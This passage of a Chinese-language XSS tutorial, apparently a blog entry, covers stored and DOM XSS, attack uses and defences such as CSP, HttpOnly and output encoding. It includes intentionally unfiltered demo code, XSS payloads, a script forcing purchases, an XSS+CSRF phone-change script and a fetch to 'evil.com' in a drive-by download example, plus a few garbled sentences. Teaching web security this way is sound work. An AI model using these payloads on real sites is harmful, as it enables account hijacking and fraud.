&quot;Error: &quot; . $sql . &quot;&lt;br&gt;&quot; . $conn-&gt;error;        &#125;    &#125;else&#123;        echo &quot;请填写完整信息&quot;.&quot;&lt;br&gt;&quot;;    &#125;    /*查询数据库中的留言信息*/    $sql = &quot;SELECT username, message FROM message&quot;;    $result = $conn-&gt;query($sql);    if ($result-&gt;num_rows &gt; 0) &#123;        while($row = $result-&gt;fetch_assoc()) &#123;            echo &quot;用户名：&quot; . $row[&quot;username&quot;]. &quot;留言内容:&quot; . $row[&quot;message&quot;].&quot;&lt;br&gt;&quot;;        &#125;    &#125; else &#123;        echo &quot;暂无留言&quot;;    &#125;?&gt;


上面就是代码运行的结果，可以写入用户与姓名，且结果会展现在页面并存入数据库，无论任何用户何时访问当前网站都会出现留言板的信息，此时若有恶意攻击者写入js脚本在留言板中，就会导致后面所有访问的用户都执行该js脚本
我们试验一下，在留言处写入&lt;script&gt;alter(11)&lt;/script&gt;


结果符合我们的设想，存储型 XSS 的攻击是最隐蔽的也是危害比较大的，普通用户所看的 URL 为 http://localhost/php/xss/save.php，从 URL 上看均是正常的，但是当目标用户查看留言板时，那些留言的内容会从数据库查询出来并显示，浏览器发现有 XSS 代码，就当做正常的 HTML 与 JS 解析执行，于是就触发了 XSS 攻击。
dom型

通过修改页面的 DOM 节点形成的 XSS，称之为 DOM XSS。它和反射型 XSS、存储型 XSS 的差别在于，DOM XSS 的 XSS 代码并不需要服务器解析响应的直接参与，触发 XSS 靠的就是浏览器端的 DOM 解析，可以认为完全是客户端的事情。
【DOM 节点（DOM Node）是 文档对象模型（Document Object Model） 的基本组成单位，DOM 将 HTML&#x2F;XML 文档视为一个由节点组成的树形结构，每个节点代表文档中的一部分（如标签、文本、属性等）】
代码依旧参考国光
&lt;meta charset=&quot;UTF-8&quot;&gt;&lt;script&gt;    function xss()&#123;        var str = document.getElementById(&quot;src&quot;).value;        document.getElementById(&quot;demo&quot;).innerHTML = &quot;&lt;img src=&#x27;&quot;+str+&quot;&#x27; /&gt;&quot;;    &#125;&lt;/script&gt;&lt;input type=&quot;text&quot; id=&quot;src&quot; size=&quot;50&quot; placeholder=&quot;输入图片地址&quot; /&gt;&lt;input type=&quot;button&quot; value=&quot;插入&quot; onclick=&quot;xss()&quot; /&gt;&lt;br&gt;&lt;div id=&quot;demo&quot; &gt;&lt;/div&gt;






同样，这里也没有对用户的输入进入过滤，当攻击者构造&#39; onerror=&#39;alert(233)插入的时候：

会直接在 img 标签中插入 onerror 事件，该语句表示当图片加载出错的时候，自动触发后面的 alert () 函数，来达到弹窗的效果，这就是一个最简单的 DOM 型 XSS 漏洞。
但更正式点的dom型应该 对 window.location、document.URL、document.referrer、document.cookie 等包含用户可控数据的对象进行操作
三种类型区别

对三种xss都有了解过后，我们来聊聊三种xss都有什么区别
dom型与反射型和存储型最大的区别就是：dom型由客户端独立完成，不经过服务端
恶意脚本不在服务器返回的 HTML 源码中，仅在客户端执行 JS 后动态插入 DOM，查看页面源码无法发现，需通过浏览器开发者工具（Elements 面板）查看动态生成的 DOM。
而反射型与存储型都需要服务端的参与，反射型是服务端将恶意数据反射回客户端，存储型也会将恶意数据反射回客户端， 但恶意脚本会被永久存储在服务器中，反射型的生命周期只有一次
xss利用

要学会防护，当然要先学会利用（文中出现的利用都是设想情况，无实际利用过，具体利用可以自己搭靶场测试）
xss有以下利用方式：

网络钓鱼
盗取用户 cookies 信息
劫持用户浏览器
强制弹出广告页面、刷流量
网页挂马
进行恶意操作，例如任意篡改页面信息
获取客户端隐私信息
控制受害者机器向其他网站发起攻击
结合其他漏洞，如 CSRF 漏洞，实施进一步作恶
提升用户权限，包括进一步渗透网站
传播跨站脚本蠕虫等


劫持用户浏览器
注入的恶意脚本和用户正常操作的脚本拥有完全相同的权限，能：

操作页面 DOM（点击按钮、填充表单、触发事件）。

发起网络请求（携带用户的 Cookie、会话凭证）。

读取 &#x2F; 修改页面数据（获取表单内容、修改提交参数）。
因为操作在用户已登录的上下文执行，网站服务器会默认这些操作是用户本人发起的，完全不会拦截，风险比单纯窃取信息更直接.

简单写个代码举例介绍一下
一个购物网站存在存储型xss
&lt;script&gt;window.onload = function() &#123;  document.querySelector(&#x27;[data-product-id=&quot;10086&quot;] .add-cart-btn&#x27;).click();  setTimeout(() =&gt; &#123;    window.location.href = &#x27;/checkout&#x27;;  &#125;, 1000);  setTimeout(() =&gt; &#123;    document.querySelector(&#x27;#receiver-name&#x27;).value = &#x27;张三&#x27;;    document.querySelector(&#x27;#receiver-phone&#x27;).value = &#x27;138xxxx8888&#x27;;    document.querySelector(&#x27;#receiver-address&#x27;).value = &#x27;XX市XX区XX路XX号&#x27;;    document.querySelector(&#x27;.submit-order-btn&#x27;).click();  &#125;, 2000);&#125;;&lt;/script&gt;

当用户（已登录电商账号，且账户有余额 &#x2F; 绑定支付方式）浏览该商品评价时，脚本自动执行：

无需用户操作，自动将高价海鲜加入购物车。
跳转结算页后，填充攻击者的收货地址。
直接提交订单，触发支付（若用户开通了 “免密支付”，则直接扣款）。

网站服务器收到订单请求时，因携带用户的登录会话 Cookie，判定为用户本人操作，成功创建订单并完成支付。用户直到收到扣款通知，才发现被恶意下单。



网页挂马
XSS 是 “入口”，负责将恶意触发代码植入可信页面；真正的 “挂马” 依赖恶意资源（攻击脚本、漏洞利用程序、病毒文件）和用户环境漏洞（浏览器旧版本、插件漏洞、系统漏洞），两者结合完成从 “脚本执行” 到 “设备受控” 的升级。
例子：
攻击者发现某购物网站的 “商品问答区” 存在存储型 XSS 漏洞，注入代码
&lt;div onclick=&quot;fetch(&#x27;http://evil.com/load-attack&#x27;)&quot;&gt;点击查看商品隐藏优惠（仅限前100人）&lt;/div&gt;


attack.js检测用户浏览器版本存在的漏洞，加载对应漏洞利用脚本。

脚本下载恶意程序shopping-voucher.exe（伪装成 “优惠券领取工具”）。

弹出弹窗：“领取优惠券需安装安全插件，点击运行即可使用”，用户点击 “运行” 后，恶意程序执行。

恶意程序在用户设备上安装后门，回连攻击者 C2 服务器，用户电脑被完全控制，后续可能被窃取支付密码、银行信息等。



xss+csrf
以 “篡改用户绑定手机号” 为例，完整攻击链路如下
&lt;script&gt;  // 1. XSS脚本读取页面中的CSRF Token（假设在隐藏表单中）  const csrfToken = document.querySelector(&#x27;input[name=&quot;csrf_token&quot;]&#x27;).value;  // 2. 自动构造“修改手机号”的POST请求（CSRF攻击）  fetch(&#x27;/api/change-phone&#x27;, &#123;    method: &#x27;POST&#x27;,    headers: &#123; &#x27;Content-Type&#x27;: &#x27;application/x-www-form-urlencoded&#x27; &#125;,    body: `csrf_token=$&#123;csrfToken&#125;&amp;new_phone=攻击者手机号`,    credentials: &#x27;include&#x27; // 携带用户登录Cookie  &#125;);&lt;/script&gt;


用户触发 XSS：其他用户（已登录）浏览含恶意评论的页面时，脚本自动执行。
CSRF 请求生效：脚本携带用户的登录 Cookie 和合法 CSRF Token 发起请求，服务器验证通过（认为是用户本人操作），成功将手机号改为攻击者的号码。



xss防护



在介绍具体防护之前，先介绍一些基础知识
Httponly


HttpOnly是Cookie中一个属性，用于防止客户端脚本通过document.cookie属性访问Cookie，有助于保护Cookie不被跨站脚本攻击窃取或篡改。但是，HttpOnly的应用仍存在局限性，一些浏览器可以阻止客户端脚本对Cookie的读操作，但允许写操作；此外大多数浏览器仍允许通过XMLHTTP对象读取HTTP响应中的Set-Cookie头。

设置样例

response.setHeader( &quot;Set-Cookie&quot; , &quot;cookiename=httponlyTest;Path=/;Domain=domainvalue;Max-Age=seconds;HTTPOnly&quot;);  例如：//设置cookie//Path=/：限制 Cookie 的作用路径。response.addHeader(&quot;Set-Cookie&quot;, &quot;uid=112; Path=/; HttpOnly&quot;)//设置多个cookieresponse.addHeader(&quot;Set-Cookie&quot;, &quot;uid=112; Path=/; HttpOnly&quot;);response.addHeader(&quot;Set-Cookie&quot;, &quot;timeout=30; Path=/test; HttpOnly&quot;);//设置https的cookieresponse.addHeader(&quot;Set-Cookie&quot;, &quot;uid=112; Path=/; Secure; HttpOnly&quot;);//Secure：限制 Cookie 仅在 HTTPS 加密连接中传输，HTTP 明文连接不会携带该 Cookie。



SOP(Same-origin policy)


同源策略是一种网络浏览器安全机制，旨在防止网站之间相互攻击。
同源策略限制一个源上的脚本访问另一个源上的数据。源由 URI 协议、域名和端口号组成。同源就意味着协议，域名，端口都必须相同，访问其下子目录则没问题

同源政策存在多种例外情况：
有些对象可以跨域写入，但不能跨域读取，例如来自 iframe 或新窗口的 location对象或属性。location.href
有些对象是可读的，但不能跨域写入，例如对象length的属性window（存储页面上使用的帧数）和closed属性。
该replace函数通常可以跨域调用对象location。
您可以跨域调用某些函数。例如，您可以在新窗口中调用 getMessage()  和close  getMessage() 函数。该函数也可以在 iframe 和新窗口中调用，以便将消息从一个域发送到另一个域。 blur focus postMessage



CORS

跨源资源共享（CORS，或通俗地译为跨域资源共享）是一种基于 HTTP 头的机制，该机制通过允许服务器标示除了它自己以外的其他源（域、协议或端口），使得浏览器允许这些源访问加载自己的资源。
跨源资源共享标准新增了一组 HTTP 标头字段，允许服务器声明哪些源站通过浏览器有权限访问哪些资源。另外，规范要求，对那些可能对服务器数据产生副作用的 HTTP 请求方法（特别是 GET 以外的 HTTP 请求，或者搭配某些 MIME 类型的 POST 请求），浏览器必须首先使用 OPTIONS 方法发起一个预检请求（preflight request），从而获知服务端是否允许该跨源请求。服务器确认允许之后，才发起实际的 HTTP 请求。在预检请求的返回中，服务器端也可以通知客户端，是否需要携带身份凭证（例如 Cookie 和 HTTP 认证相关数据）。
CSP(Content security policy)



CSP 是一种浏览器安全机制，旨在缓解 XSS 和其他一些攻击。它的工作原理是限制页面可以加载的资源（例如脚本和图像），并限制页面是否可以被其他页面嵌入。
要启用 CSP，响应需要包含一个名为 &lt;CSP_DIR&gt; 的 HTTP 响应头，Content-Security-Policy其值包含策略信息。策略本身由一个或多个指令组成，指令之间用分号分隔。
Content-Security-Policy:    default-src &#x27;self&#x27;;    //所有未单独指定的资源，都只能从当前同源加载    script-src &#x27;self&#x27;;    //只允许加载本站 JavaScript    style-src &#x27;self&#x27;;    //只允许本站 CSS 样式    img-src &#x27;self&#x27;;    object-src &#x27;none&#x27;;    frame-ancestors &#x27;none&#x27;;    //禁止页面被任何 iframe/frame 嵌套    base-uri &#x27;self&#x27;;    //控制 &lt;base href=&quot;...&quot;&gt; 的来源    connect-src &#x27;self&#x27;;    //限制 AJAX / fetch / WebSocket 只能访问同源







了解了上面的基础知识就可以更好的了解我们下面要讲的防护了
跨站脚本攻击的防范通常可以通过两层防御来实现：

对输出数据进行编码
到达时验证输入

对输出进行编码

编码应该在将用户可控数据写入页面之前立即应用，因为写入的上下文决定了需要使用哪种编码。例如，JavaScript 字符串中的值需要与 HTML 上下文中的值不同的转义方式。
在 HTML 环境中，您应该将未列入白名单的值转换为 HTML 实体：

&lt;转换为：&lt;
&gt;转换为：&gt;

在 JavaScript 字符串上下文中，非字母数字值应该进行 Unicode 转义：

&lt;转换为：\u003c
&gt;转换为：\u003e

有时您需要按正确的顺序应用多层编码。例如，要安全地将用户输入嵌入到事件处理程序中，您需要同时处理 JavaScript 上下文和 HTML 上下文。因此，您需要先对输入进行 Unicode 转义，然后再进行 HTML 编码：
&lt;a href=&quot;#&quot; onclick=&quot;x=&#x27;This string needs two layers of escaping&#x27;&quot;&gt;test&lt;/a&gt;





到达时验证

编码可能是抵御 XSS 攻击最重要的防线，但它不足以在所有情况下都完全防止 XSS 漏洞。您还应该在首次收到用户输入时就尽可能严格地验证其有效性。
输入验证示例包括：

如果用户提交的 URL 将在响应中返回，请验证其是否以安全的协议（例如 HTTP 和 HTTPS）开头。否则，有人可能会使用有害协议（例如 HTTPS 或javascriptHTTPS）攻击您的网站data。
如果用户提供的值预期为数值，则验证该值是否实际包含整数。
验证输入是否仅包含预期的字符集。

理想的输入验证方式应该是直接阻止无效输入。另一种尝试清除无效输入使其有效的方法更容易出错，应尽可能避免。
CSP防xss

内容安全策略 (CSP) 是抵御跨站脚本攻击的最后一道防线。如果您的 XSS 防护措施失效，您可以使用 CSP 通过限制攻击者的操作来缓解 XSS 攻击。
CSP 允许您控制各种事项，例如是否允许加载外部脚本以及是否执行内联脚本。要部署 CSP，您需要在 HTTP 响应头中添加一个名为 &lt;header_name&gt; 的参数，Content-Security-Policy其值包含您的策略。
以下是一个CSP示例：
default-src &#x27;self&#x27;; script-src &#x27;self&#x27;; object-src &#x27;none&#x27;; frame-src &#x27;none&#x27;; base-uri &#x27;none&#x27;;

此策略规定，图片和脚本等资源只能从与主页相同的源加载。因此，即使攻击者成功注入了 XSS 有效载荷，他们也只能从当前源加载资源。这大大降低了攻击者利用 XSS 漏洞的可能性。
如果您需要加载外部资源，请确保仅允许不会帮助攻击者利用您网站的脚本。例如，如果您将某些域名列入白名单，攻击者就可以加载来自这些域名的任何脚本。尽可能将资源托管在您自己的域名上。
php中防xss

PHP 中有一个名为 encode 的内置函数用于对实体进行编码htmlentities。在 HTML 上下文中，您应该调用此函数来转义输入。该函数应使用三个参数调用：

您输入的字符串。
ENT_QUOTES这是一个标志，用于指定所有引号都应该进行编码。
字符集在大多数情况下应为 UTF-8。

例如：
&lt;?php echo htmlentities($input, ENT_QUOTES, &#x27;UTF-8&#x27;);?&gt;]]></content>
      <categories>
        <category>web</category>
      </categories>
      <tags>
        <tag>xss</tag>
      </tags>
  </entry>
</search>
